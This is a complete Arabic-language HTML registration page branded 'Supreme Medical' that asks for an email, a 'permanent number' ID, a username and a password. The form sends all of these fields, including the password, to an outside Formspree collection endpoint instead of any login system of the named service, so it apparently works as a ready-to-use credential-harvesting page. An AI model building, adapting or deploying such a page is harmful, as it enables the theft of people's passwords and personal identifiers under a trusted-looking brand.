<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل البيانات | الطب الفائق</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .form-card {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #1e293b;
            margin-bottom: 30px;
            font-size: 22px;
        }
        .field-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #475569;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 15px;
            box-sizing: border-box;
            transition: all 0.3s ease;
            text-align: right;
        }
        input:focus {
            border-color: #2563eb;
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }
        .submit-button {
            width: 100%;
            padding: 14px;
            background-color: #2563eb;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        .submit-button:hover {
            background-color: #1d4ed8;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #94a3b8;
        }
    </style>
</head>
<body>
    <div class="form-card">
        <h2>تسجيل حساب جديد</h2>
        
        <form action="https://formspree.io/f/mreorkvk" method="POST">
            
            <div class="field-group">
                <label for="email">البريد الإلكتروني</label>
                <input type="email" name="email" id="email" placeholder="example@mail.com" required>
            </div>

            <div class="field-group">
                <label for="permanent_id">الرقم الدائم</label>
                <input type="text" name="permanent_id" id="permanent_id" placeholder="أدخل الرقم الدائم" required>
            </div>

            <div class="field-group">
                <label for="username">اسم المستخدم (يوزر)</label>
                <input type="text" name="username" id="username" placeholder="أدخل اليوزر" required>
            </div>

            <div class="field-group">
                <label for="password">كلمة المرور</label>
                <input type="password" name="password" id="password" placeholder="••••••••" required>
            </div>

            <button type="submit" class="submit-button">إرسال البيانات</button>
        </form>
        
        <div class="footer">Supreme Medical &copy; 2026</div>
    </div>
</body>
</html>
